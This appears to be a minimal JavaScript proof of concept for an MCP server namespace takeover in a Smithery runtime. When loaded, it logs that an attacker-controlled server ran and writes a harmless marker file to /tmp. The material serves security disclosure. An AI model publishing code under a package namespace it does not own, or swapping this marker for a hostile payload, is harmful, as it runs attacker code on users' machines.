console.log("POC: Attacker-controlled MCP server executed");
const fs = require('fs');
fs.writeFileSync('/tmp/amazon_poc.txt', 'Namespace takeover successful');
module.exports = {}; // Prevent Smithery runtime from hanging
